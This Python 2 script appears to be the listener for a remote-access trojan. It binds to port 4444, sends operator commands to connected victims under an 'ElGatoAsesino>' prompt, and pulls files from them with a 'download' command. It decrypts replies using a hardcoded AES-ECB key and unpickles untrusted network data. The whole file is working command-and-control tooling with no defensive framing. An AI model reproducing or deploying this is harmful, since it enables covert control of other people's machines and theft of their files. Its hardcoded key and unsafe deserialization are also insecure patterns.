#!/usr/bin/python

import socket
from thread import *
import sys
import pickle
from Crypto.Cipher import AES


unpad = lambda s: s[:-ord(s[len(s) - 1:])]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    s.bind(("0.0.0.0", 4444))
except socket.error, v:
    print "Binding failed. Error code : " + str(v[0]) + " Message " + v[1]
    sys.exit()


print "Socket bind complete"

s.listen(10)
print "[+] Listening to the incoming connection on port 4444..."

#def clientthread_sendpublickey(client) :
#    client.send(pickle.dumps(public_key))

def do_decrypt(ciphertext):
    obj2 = AES.new('This_is_a_key123', AES.MODE_ECB)
    message = obj2.decrypt(ciphertext)
    return unpad(message)


def clienthandle(client) :
    while True :
        command = raw_input('ElGatoAsesino> ')
        client.send(command)

        if command == 'quit' :
            break
        if 'download' in command:
            #print buf
            #encreply = pickle.loads(buf)
            a = command.replace("download","")
            a = a.replace(" ", "")
            with open("copy"+a, 'a') as f:
                buf = client.recv(35000)
                f.write(buf)


        else:
            buf = client.recv(1024)
            encreply = pickle.loads(buf)
            print do_decrypt(encreply)
        #print key.decrypt(encreply)

while True:
    (client, (ip, port)) = s.accept()
    print "Received connection from : ", ip
    #start_new_thread(clientthread_sendpublickey, (client,))
    #print "Public Key sent to", ip
    start_new_thread(clienthandle, (client,))
